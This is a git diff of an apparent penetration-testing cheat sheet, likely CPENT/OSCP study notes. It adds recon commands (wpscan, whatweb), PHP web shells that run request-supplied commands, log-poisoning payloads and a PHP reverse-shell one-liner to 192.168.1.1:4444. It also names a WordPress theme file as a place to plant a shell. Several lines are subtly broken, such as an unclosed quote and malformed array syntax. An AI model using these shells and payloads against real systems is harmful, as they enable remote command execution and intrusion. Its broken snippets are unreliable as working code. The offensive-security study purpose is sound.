@@ -1,4 +1,5 @@
 Markdown語法：https://hackmd.io/@eMP9zQQ0Qt6I8Uqp2Vqy6w/SyiOheL5N/%2FBVqowKshRH246Q7UDyodFA  
+  
 https://blog.stevenyu.tw/2022/06/10/%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90-cpent-%E8%80%83%E8%A9%A6%E5%BF%83%E5%BE%97%E3%80%81%E4%BB%A5%E5%8F%8A%E8%88%87-oscp-%E7%9A%84%E6%AF%94%E8%BC%83/  
 ## NMAP Reacon ##  
 nmap -sS -n -p 445 --script smb-protocls 192.168.1.1 
@@ -73,9 +74,17 @@ sudo ./fat3.py (filename)
 john --wordlist=/usr/share/wordlists/rockyou.txt <Filename>  
 # Hashcat  
 
-## Web Recon  
-# Nikto  
-# wpscan  
+## Web Recon #  
+# Nikto #    
+# wpscan #  
+```wpscan --update ```  
+```wpscan --enumate```  
+```wpscan -e u,p ```  
+
+# Whatweb #  
+``` whatweb 192.168.1.1  ```   
+``` whatweb -v 192.168.1.1 ```   
+``` whatweb --log-verbose=log.txt 192.168.1.1 ```   
 
 ## Log Poison  
 # SSH Log (/var/log/auth.log)  
@@ -85,8 +94,19 @@ ssh -l '<?php system($_GET["cmd"]); ?>'@192.168.1.1
 User-Agent: <?php system($_GET['cmd']); ?>
 
 ## Reverse Shell
-# php
-``` php -r '$sock=fsockopen("192.168.1.1",4444);$proc=proc_open("/bin/sh -i", array(0>=$sock, 1=>$sock, 2=>sock),$pipes);' ```
+# php #  
+``` php -r '$sock=fsockopen("192.168.1.1",4444);$proc=proc_open("/bin/sh -i", array(0>=$sock, 1=>$sock, 2=>sock),$pipes);' ```  
+``` <?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?> ```  
+``` <?php system($_GET['cmd]); ?> ```  
+
 
 ## TTY ##  
 ``` python3 -c 'import pty; pty.spawn("/bin/sh")' ```  
+
+## Wordpress ##  
+http://192.168.1.1/wp-content/themes/twentyfifteen/404.php  
+
+## Open Source Target ##  
+# http://testphp.vulnweb.com/ #  
+
+
